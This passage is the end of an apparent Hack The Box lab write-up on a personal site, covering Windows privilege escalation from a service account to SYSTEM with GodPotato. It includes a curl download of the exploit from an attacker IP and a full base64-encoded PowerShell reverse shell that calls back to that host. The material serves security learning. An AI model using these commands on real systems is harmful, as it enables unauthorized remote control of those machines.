+whoami
+nt authority\local service
+
+C:\Windows\system32&gt;whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State
+============================= ========================================= =======
+SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled
+SeAuditPrivilege              Generate security audits                  Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege       Create global objects                     Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled</code></pre></li>
+<li>Running godpotato<pre><code>curl http://10.10.16.2:8080/GodPotato-NET4.exe -o gp.exe
+
+c:\xampp\htdocs&gt;gp.exe -cmd "cmd /c whoami"
+gp.exe -cmd "cmd /c whoami"
+[*] CombaseModule: 0x140732648390656
+[*] DispatchTable: 0x140732650696816
+[*] UseProtseqFunction: 0x140732650072992
+[*] UseProtseqFunctionParamCount: 6
+[*] HookRPC
+[*] Start PipeServer
+[*] Trigger RPCSS
+[*] CreateNamedPipe \\.\pipe\c18277b5-488e-4603-af75-cb0ebae1d897\pipe\epmapper
+[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
+[*] DCOM obj IPID: 00004c02-0cf4-ffff-5681-1903035d2e8b
+[*] DCOM obj OXID: 0x5d7916108e711129
+[*] DCOM obj OID: 0xa0ceb995b49a58d2
+[*] DCOM obj Flags: 0x281
+[*] DCOM obj PublicRefs: 0x0
+[*] Marshal Object bytes len: 100
+[*] UnMarshal Object
+[*] Pipe Connected!
+[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
+[*] CurrentsImpersonationLevel: Impersonation
+[*] Start Search System Token
+[*] PID : 860 Token:0x808  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
+[*] Find System Token : True
+[*] UnmarshalObject: 0x80070776
+[*] CurrentUser: NT AUTHORITY\SYSTEM
+[*] process start with pid 4392
+nt authority\system
+
+# start nc listener on port 443
+
+gp.exe -cmd "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMgAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
+
+PS C:\xampp\htdocs&gt; whoami                                                                                                       │
+nt authority\system</code></pre><p>→ Obtained SYSTEM</p><p><strong>Flag</strong> → <mark class="highlight-teal" data-notion-highlight="teal"><strong>56bae815185e1b7de7836f456ee7999c</strong></mark></p></li></ol></li></ol>
+
+<figure><img src="../assets/images/htb/visual/05-untitled-4.png" alt=""></figure>
+
+
+                </article>
+
+                <aside class="toc">
+                    <p class="toc-k">Contents</p>
+                    <ul id="toc-list"></ul>
+                </aside>
+            </div>
+        </main>
+
+        <footer class="site-foot">
+            <div class="foot-in">
+                <p class="copy">© <span data-year></span> Frédéric Goossens · <span class="credit">vibe coded</span></p>
+                <div class="socials">
+                    <a class="slink" href="https://github.com/fredericgoossens" target="_blank" rel="noopener noreferrer"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg><span>GitHub</span></a>
+                    <a class="slink" href="https://www.linkedin.com/in/fr%C3%A9d%C3%A9ric-goossens-0344b1241/" target="_blank" rel="noopener noreferrer"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg><span>LinkedIn</span></a>
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <div class="scroll-hint" data-scroll-hint aria-hidden="true"></div>
+    <script src="../assets/js/site.js?v=66"></script>
+</body>
+</html>
